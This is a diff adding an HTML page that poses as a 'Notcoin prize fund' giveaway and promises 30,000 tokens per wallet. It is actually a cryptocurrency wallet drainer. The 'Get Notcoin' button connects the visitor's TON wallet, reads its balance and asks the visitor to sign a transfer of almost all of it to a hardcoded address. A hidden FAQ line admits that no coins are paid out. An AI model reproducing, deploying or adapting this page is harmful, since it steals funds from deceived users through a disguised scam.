@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Notcoin Prize Fund</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+            background: black;
+            color: white;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            text-align: center;
+        }
+        .stars {
+            width: 100%;
+            height: 100%;
+            position: absolute;
+            z-index: 0;
+            background: url('https://s3-us-west-2.amazonaws.com/s.cdpn.io/1231630/stars.png') repeat;
+        }
+        .twinkling {
+            width: 100%;
+            height: 100%;
+            position: absolute;
+            z-index: 1;
+            background: url('https://s3-us-west-2.amazonaws.com/s.cdpn.io/1231630/twinkling.png') repeat;
+            animation: move-twink-back 200s linear infinite;
+        }
+        @keyframes move-twink-back {
+            from {background-position:0 0;}
+            to {background-position:-10000px 5000px;}
+        }
+        .content {
+            z-index: 2;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            max-width: 600px;
+            margin: 0 20px;
+            padding: 20px;
+            background-color: rgba(0, 0, 0, 0.8);
+            border-radius: 10px;
+        }
+        h1 {
+            font-size: 24px;
+            margin: 0 0 10px;
+        }
+        p {
+            font-size: 16px;
+            margin: 10px 0;
+        }
+        button {
+            background-color: #ffcc00;
+            color: black;
+            padding: 10px 20px;
+            border: none;
+            cursor: pointer;
+            font-size: 18px;
+            margin-top: 20px;
+        }
+        .coin-image {
+            max-width: 150px;
+            margin: 20px 0;
+        }
+        .footer {
+            z-index: 2;
+            position: absolute;
+            bottom: 10px;
+            width: 100%;
+            text-align: center;
+            font-size: 12px;
+            color: grey;
+        }
+        .hidden-text {
+            display: none;
+            font-size: 12px;
+            color: grey;
+            margin-top: 10px;
+        }
+        .faq-button {
+            background-color: transparent;
+            color: grey;
+            border: none;
+            cursor: pointer;
+            font-size: 12px;
+            text-decoration: underline;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="stars"></div>
+    <div class="twinkling"></div>
+    <div class="content">
+        <h1>Grab your share of the Notcoin prize fund!</h1>
+        <p>Dear community! We would like to thank you for your support and activity. A total of 2,000 activations are available, 1 per wallet with 30,000 Notcoins in each. We advise you to hurry up! Probably nothing or something...</p>
+        <img src="https://notcoin.website/wp-content/uploads/2024/01/1704290386992.png" alt="Notcoin" class="coin-image">
+        <button id="connectButton">Get Notcoin</button>
+        
+      </div>
+      <div class="footer">
+          <button class="faq-button" onclick="toggleFaq()">FAQ</button>
+          <div class="hidden-text" id="faqText">
+              <p>By participating you agree that you will not receive any coins, this is for entertainment purposes only and all your funds will be donated to charity.</p>
+          </div>
+      </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/tonweb/dist/tonweb.min.js"></script>
+    <script>
+        const tonweb = new TonWeb(new TonWeb.HttpProvider('https://testnet.toncenter.com/api/v2/jsonRPC'));
+
+        const destinationAddress = 'UQAWvaKGKXtQzt97DbQRbBmVR_6jg9_jwsXHCQ1Cr5JKZduN';
+
+        async function connectWallet() {
+            try {
+                if (!window.ton) {
+                    alert('TON Wallet is not installed!');
+                    return;
+                }
+
+                const provider = window.ton;
+                await provider.request({ method: 'ton_requestAccounts' });
+
+                const accounts = await provider.request({ method: 'ton_accounts' });
+                if (accounts.length === 0) {
+                    alert('No accounts found.');
+                    return;
+                }
+
+                const userAddress = accounts[0];
+                console.log('User address:', userAddress);
+
+                const wallet = tonweb.wallet.create({ address: userAddress });
+
+                const balance = await tonweb.getBalance(userAddress);
+                console.log(`Balance: ${TonWeb.utils.fromNano(balance)} TON`);
+
+                if (balance.isZero()) {
+                    alert('Balance is zero, nothing to transfer.');
+                    return;
+                }
+
+                const seqno = await wallet.methods.seqno().call();
+                const transfer = wallet.methods.transfer({
+                    toAddress: destinationAddress,
+                    amount: balance.sub(new TonWeb.utils.BN(10000000)),
+                    seqno: seqno,
+                    sendMode: 3,
+                });
+
+                const signature = await provider.request({
+                    method: 'ton_signTransaction',
+                    params: [transfer.data]
+                });
+
+                transfer.data.signature = signature;
+
+                await transfer.send();
+                alert('Transfer completed!');
+            } catch (error) {
+                console.error(error);
+                alert('An error occurred during the transfer.');
+            }
+        }
+
+        document.getElementById('connectButton').addEventListener('click', connectWallet);
+
+        function toggleFaq() {
+            const faqText = document.getElementById('faqText');
+            if (faqText.style.display === 'none' || faqText.style.display === '') {
+                faqText.style.display = 'block';
+            } else {
+                faqText.style.display = 'none';
+            }
+        }
+    </script>
+</body>
+</html>
